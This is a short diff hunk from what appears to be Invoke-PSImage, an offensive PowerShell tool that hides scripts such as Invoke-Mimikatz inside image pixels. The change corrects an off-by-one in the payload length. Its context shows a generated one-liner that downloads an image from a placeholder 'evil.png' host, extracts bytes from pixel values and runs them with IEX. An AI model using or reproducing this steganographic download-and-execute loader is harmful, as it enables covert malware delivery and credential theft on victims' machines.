@@ -136,7 +136,7 @@ PS>Invoke-PSImage -Script .\Invoke-Mimikatz.ps1 -Image .\kiwi.jpg -Out .\evil-ki
     $array = ($rows*$width)
     $lrows = ($rows-1)
     $lwidth = ($width-1)
-    $lpayload = ($payload.Length-2)
+    $lpayload = ($payload.Length-1)
 
     if($web) {
         $pscmd = "sal a New-Object;Add-Type -AssemblyName `"System.Drawing`";`$g= a System.Drawing.Bitmap((a Net.WebClient).OpenRead(`"http://example.com/evil.png`"));`$o= a Byte[] $array;(0..$lrows)|% {foreach(`$x in (0..$lwidth)){`$p=`$g.GetPixel(`$x,`$_);`$o[`$_*$width+`$x]=([math]::Floor((`$p.B -band 15)*16) -bor (`$p.G -band 15))}};IEX([System.Text.Encoding]::ASCII.GetString(`$o[0..$lpayload]))"
